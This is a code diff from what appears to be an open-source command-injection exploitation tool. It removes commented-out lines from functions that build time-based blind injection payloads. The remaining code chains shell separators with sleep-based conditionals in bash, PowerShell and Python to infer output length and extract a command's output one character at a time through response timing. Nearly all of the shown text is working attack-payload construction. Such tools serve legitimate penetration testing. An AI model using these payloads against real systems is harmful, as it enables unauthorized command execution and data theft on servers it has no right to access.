@@ -35,7 +35,6 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
@@ -50,26 +49,21 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
-                 # "then sleep 0" + separator +
                  "then sleep " + str(timesec) + separator +
                  "fi"
                  )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  "sleep 0 " + separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
       
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -101,7 +95,6 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -118,12 +111,10 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  # Find the length of the output, using readline().
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
@@ -133,7 +124,6 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
 
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -198,7 +188,6 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -217,27 +206,22 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     if separator in (";", "%0a"):
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length \"$" + settings.RANDOM_VAR_GENERATOR + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                  "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
-                 # "then sleep 0" + separator +
                  "then sleep " + str(timesec) + separator +
                  "fi"
                 )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  "sleep 0" + separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
                  settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
-                 # settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "expr length $" + settings.RANDOM_VAR_GENERATOR + ")" + separator +
                  "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
                  "sleep " + str(timesec)
                  )
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -268,7 +252,6 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -286,12 +269,10 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  # Find the length of the output, using readline().
                  settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(output_length) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
-                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -301,7 +282,6 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\") "
                  )
 
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -476,13 +456,11 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + separator +
                 settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + separator +
                 "if [ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + separator +
-                # "then sleep 0" + separator +
                 "then sleep " + str(timesec) + separator +
                 "fi"
                 )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0 " + separator +
@@ -494,7 +472,6 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ] " + separator +
                 "sleep " + str(timesec)
                 )
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -530,7 +507,6 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                 )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -547,13 +523,11 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -562,7 +536,6 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
       
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -595,7 +568,6 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" +
@@ -611,13 +583,11 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
                  "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
-                 # "then sleep 0" + separator +
                  "then sleep " + str(timesec) + separator +
                  "fi"
                  )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  "sleep 0 " + separator +
@@ -625,7 +595,6 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
                  "[ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ] " + separator +
                  "sleep " + str(timesec)
                  )
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
@@ -655,7 +624,6 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                 "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand + settings.SINGLE_WHITESPACE +
                 "for /f \"tokens=*\" %i in ('cmd /c " +
@@ -671,13 +639,11 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
       payload = (separator +
                  settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
                  "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
-                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                  "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
 
     elif separator == _urllib.parse.quote("&&") :
-      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
@@ -686,7 +652,6 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
                  settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
 
-      # separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
